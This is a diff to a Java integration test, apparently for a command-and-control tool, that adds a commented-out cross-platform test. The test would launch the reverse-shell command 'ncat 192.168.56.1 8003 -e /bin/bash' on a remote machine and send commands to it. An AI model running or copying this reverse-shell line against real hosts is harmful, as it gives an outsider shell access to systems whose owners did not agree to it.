@@ -4,6 +4,7 @@ import java.io.IOException;
 
 import org.junit.jupiter.api.Test;
 
+import c2.remote.RemoteTestExecutor;
 import util.test.ClientServerTest;
 import util.test.RunnerTestGeneric;
 import util.test.TestConfiguration;
@@ -33,6 +34,23 @@ class NcatIntegrationTest extends ClientServerTest {
 		awaitClient();
 		teardown();
 
+	}
+	
+	@Test
+	void testCrossPlatform() {
+		//TODO Implement me!!!
+		/*
+		initiateServer();
+		
+		RemoteTestExecutor exec = new RemoteTestExecutor();
+		exec.startTestProgram(1005, "ncat 192.168.56.1 8003 -e /bin/bash");
+		
+		System.out.println("Transmitting commands");
+		
+		TestConfiguration config = new TestConfiguration(OS.LINUX, "Native", "TCP");
+		RunnerTestGeneric.test(config);
+		teardown();
+		*/
 	}
 
 }
